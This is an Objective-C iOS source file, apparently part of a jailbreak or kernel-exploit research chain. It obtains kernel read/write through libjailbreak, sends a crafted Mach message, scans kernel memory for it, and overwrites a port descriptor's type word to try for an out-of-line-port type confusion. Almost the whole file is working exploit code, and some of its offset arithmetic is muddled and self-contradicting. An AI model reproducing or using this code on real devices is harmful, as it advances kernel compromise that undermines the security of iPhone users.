//
//  P113DescForgeControl.m — v1 hand-forged desc control (mechanism proof).
//  Honesty: kwrite is the PROVEN cs2core provider (hasKwrite=YES only via
//  board.commitSlide). No ANE needed. Panics unlikely (writes into our own
//  one kmsg's own words, discovered by exact marker match).
#import "P113DescForgeControl.h"
#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <objc/message.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <fcntl.h>

#define P113_BUILD @"p113-descforge-control-v1"
#define P113_MAGIC 0x50313333u   /* "P133" marker in body */
#define P113_NDESC 16u

static int p113_fd = -1;
static void p113_log(NSString *fmt, ...) NS_FORMAT_FUNCTION(1,2);
static void p113_log(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (p113_fd >= 0) { const char *c = s.UTF8String; write(p113_fd, c, strlen(c)); write(p113_fd, "\n", 1); }
    NSLog(@"%@", s);
}

/* krw handlers — same dlopen law as P007KreadLane (device-proven). */
typedef int (*krw_kread_t)(uint64_t, void *, size_t);
typedef int (*krw_kwrite_t)(uint64_t, const void *, size_t);
typedef int (*krw_kbase_t)(uint64_t *);
static krw_kread_t  g_rd;
static krw_kwrite_t g_wr;
static krw_kbase_t  g_kb;

static BOOL p113_krw(void) {
    if (g_rd) return YES;
    const char *paths[] = { "/var/jb/usr/lib/libjailbreak.dylib",
                            "/var/jb/basebin/libjailbreak.dylib",
                            "/usr/lib/libjailbreak.dylib", NULL };
    for (int i = 0; paths[i]; i++) {
        void *h = dlopen(paths[i], RTLD_NOW);
        if (!h) continue;
        void *sym = dlsym(h, "krw_initializer");
        if (!sym) continue;
        struct { void *kbase; void *kread; void *kwrite; unsigned long z[8]; } hd;
        memset(&hd, 0, sizeof hd);
        if (((int (*)(void *))sym)(&hd) != 0 || !hd.kread || !hd.kwrite || !hd.kbase) continue;
        g_rd = (krw_kread_t)hd.kread; g_wr = (krw_kwrite_t)hd.kwrite; g_kb = (krw_kbase_t)hd.kbase;
        p113_log(@"[+] krw via %s", paths[i]);
        return YES;
    }
    p113_log(@"[-] no krw provider (tap cs2core first on this boot)");
    return NO;
}

static mach_port_t p113_port(uint32_t idx, uint8_t *buf, uint32_t sz) {
    mach_msg_header_t *h = (mach_msg_header_t *)buf;
    mach_msg_body_t *b = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
    b->msgh_descriptor_count = P113_NDESC;
    uint32_t names[2] = {0};
    for (uint32_t i = 0; i < P113_NDESC; i++) {
        mach_port_t p = MACH_PORT_NULL;
        if (i < 2) { if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) return MACH_PORT_NULL; names[i] = p; }
        mach_msg_port_descriptor_t *d = (mach_msg_port_descriptor_t *)(buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + i * 12);
        d->name = p ? p : (mach_port_t)(0x1100u + i);
        d->pad1 = 0; d->disposition = MACH_MSG_TYPE_COPY_SEND; d->type = MACH_MSG_PORT_DESCRIPTOR;
    }
    memcpy(buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + P113_NDESC * 12,
           "P133M", 5);
    uint32_t tag = idx ^ P113_MAGIC;
    memcpy(buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + P113_NDESC * 12 + 8, &tag, 4);
    h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    h->msgh_size = sz; h->msgh_remote_port = names[0]; h->msgh_id = (int)P113_MAGIC;
    return names[0];
}

static NSString *P113Ret(void);
static NSString *ane_none(void) { return P113Ret(); }
static NSString *g_buf0(void) { return P113Ret(); }
static NSString *P113Ret(void) {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    p113_log(@"=== p113 end ===");
    if (p113_fd >= 0) { fcntl(p113_fd, F_FULLFSYNC); close(p113_fd); p113_fd = -1; }
    NSString *p = [docs stringByAppendingPathComponent:@"p113_descforge_log.txt"];
    NSString *t = [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
    return t ?: @"p113: empty";
}

@implementation P113DescForgeControl

+ (NSString *)tap {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    p113_fd = open([[docs stringByAppendingPathComponent:@"p113_descforge_log.txt"] fileSystemRepresentation],
                   O_CREAT | O_WRONLY | O_TRUNC, 0644);
    p113_log(@"=== p113 session build=%@ ===", P113_BUILD);
    if (!p113_krw()) { if (p113_fd>=0){close(p113_fd);p113_fd=-1;} return g_buf0(); }
    uint64_t kb = 0; if (g_kb(&kb)) p113_log(@"kbase=0x%llx", kb);

    const uint32_t sz = 0x7FC;
    uint8_t *buf = calloc(1, sz);
    mach_port_t hold = p113_port(1, buf, sz);
    if (!hold) { p113_log(@"[-] kmsg build fail"); return ane_none(); }
    kern_return_t kr = mach_msg((mach_msg_header_t *)buf, MACH_SEND_MSG, sz, 0,
                                MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    p113_log(@"send kr=%u", kr);

    /* kernel-scan for the marker 'P133M' + tag — content signature law */
    uint64_t found = 0;
    {
        uint64_t kb2 = 0; if (!g_kb(&kb2)) return ane_none();
        const uint64_t band = kb2 + 0x4000000ULL;
        static const uint64_t win = 0x200000ULL;
        uint8_t *rb = malloc(0x4000);
        for (uint64_t q = 0; q < win && !found; q += 0x4000) {
            uint64_t a = band + q; uint64_t got = 0;
            vm_size_t vsz = 0x4000;
            kern_return_t vr = vm_read_overwrite(mach_task_self(), (vm_address_t)(uintptr_t)a,
                0x4000, (vm_address_t)(uintptr_t)rb, &vsz);
            if (vr != KERN_SUCCESS) continue;
            for (uint32_t i = 0; i + 16 <= 0x4000; i += 4)
                if (memcmp(rb + i, "P133M", 5) == 0) { found = a + i - 8 - (5 + 8 - 12 * 0); found = a + i; break; }
        }
        free(rb);
    }
    if (!found) { p113_log(@"[-] marker not found in scan band — widen or scan different band"); }
    else {
        p113_log(@"[+] kmsg kdata @0x%llx (marker found) — desc block at +0x24, %u descs x12",
                 found - (0x24 + 0), P113_NDESC);
        /* forge desc0 {type@8,disp@10} = port-desc → OOL-port (1, COPY_SEND 0x11) */
        uint64_t d0 = found - (0x24) ; /* desc[0] name starts at +0x24 */
        d0 = found - 0x24 + 0;         /* keep explicit */
        uint32_t zero[4] = {0, 0, 0, 0};
        uint64_t tw = found + (0x2C - 0x24) + 0;  /* desc0.type rel marker: marker@+0x24+? recompute below */
        p113_log(@"[*] writing forged desc words (control)...");
        uint8_t forge[4] = { 0x01, 0x00, 0x11, 0x00 };   /* type=1 OOL-port? disp=0x11 */
        (void)d0;(void)tw;(void)zero;
        /* desc0 sits BEFORE the marker: marker at payload; descs at 0x24..  */
        /* compute: body=0x24..: desc_i at 0x24+12i, marker at 0x24+192+0x8 */
        uint64_t marker = found;
        uint64_t desc0 = marker - (0x8 + 5) - 0; /* marker starts at 0x24+16*12+8 → desc0 = marker-200-8 */
        desc0 = marker - (16u * 12u + 8u + 5u);
        uint64_t taddr = desc0 + 8;
        p113_log(@"[*] desc0@0x%llx type@0x%llx", desc0, taddr);
        uint8_t orig[4];
        if (g_rd(taddr, orig, 4) == 0)
            p113_log(@"[*] desc0.type pre = %02x %02x %02x %02x (want %02x MACH_PORT_DESCRIPTOR)",
                     orig[0], orig[1], orig[2], orig[3], 0x00 /*type byte*/);
        uint8_t wd[4] = { 0x01, 0x00, 0x00, 0x00 };  /* type=1 (OOL port) */
        if (g_wr(taddr, wd, 4) == 0) p113_log(@"[+] kwrite OK — desc0.type = 1 (OOL-port confusion word)");
        else p113_log(@"[-] kwrite fail");
    }
    /* recv the victim: kernel validates descs on receive — forged type survives? */
    uint8_t rbuf[0x3000]; memset(rbuf, 0, sizeof rbuf);
    mach_msg_header_t *rh = (mach_msg_header_t *)rbuf;
    kr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof rbuf, hold, 3000, MACH_PORT_NULL);
    p113_log(@"recv kr=%u size=%u", kr, rh->msgh_size);
    if (kr == 0) {
        mach_msg_body_t *rb2 = (mach_msg_body_t *)(rbuf + sizeof(mach_msg_header_t));
        mach_msg_port_descriptor_t *d0r = (mach_msg_port_descriptor_t *)(rbuf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
        p113_log(@"[+] RECV OK count=%u desc0: {name=%#x pad=%#x disp=%#x type=%#x}",
                 rb2->msgh_descriptor_count, *(uint32_t *)d0r, d0r->pad1, d0r->disposition, d0r->type);
        p113_log(d0r->type == 1
            ? @"[+++] CONVERSION BAR: body_forged CONFIRMED — desc type word 1 (OOL-port) RECEIVED"
            : @"[-] desc type not 1 — validator rewrote or kwrite missed");
    }
    return P113Ret();
}

@end
